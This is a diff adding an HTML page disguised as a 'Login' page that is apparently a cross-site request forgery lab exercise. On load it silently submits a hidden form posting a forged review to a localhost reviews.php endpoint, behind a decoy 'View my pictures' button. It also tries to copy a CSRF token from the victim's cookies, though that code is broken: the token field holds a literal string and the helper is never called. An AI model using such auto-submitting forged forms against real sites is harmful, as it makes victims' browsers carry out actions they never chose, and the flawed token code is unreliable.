@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <div class="whole">
+        <div class="container">
+            <body onload="document.forms[0].submit()">
+
+                <form action="https://localhost/reviews.php" method="POST">
+                    <input type="hidden" name="username" value="MARIA"/>
+                    <input type="hidden" name="review" value="100000"/>
+                    <input type="hidden" name="csrf_token" value="document.cookie()"/>
+                    <input type="submit" value="View my pictures"/>
+                </form>
+
+                <script>
+                    function loadToken() {
+                        var name = "csrf_token=";
+                        var decodedCookie = decodeURIComponent(document.cookie);
+                        var ca = decodedCookie.split(';');
+                        for(var i = 0; i <ca.length; i++) {
+                            var c = ca[i];
+                            while (c.charAt(0) == ' ') {
+                                c = c.substring(1);
+                            }
+                            if (c.indexOf(name) == 0) {
+                                document.getElementById("csrf_token").value = c.substring(name.length, c.length);
+                                break;
+                            }
+                        }
+                    }
+                </script>
+            </body>
+        </div>
+    </div>
+</body>
+</html>
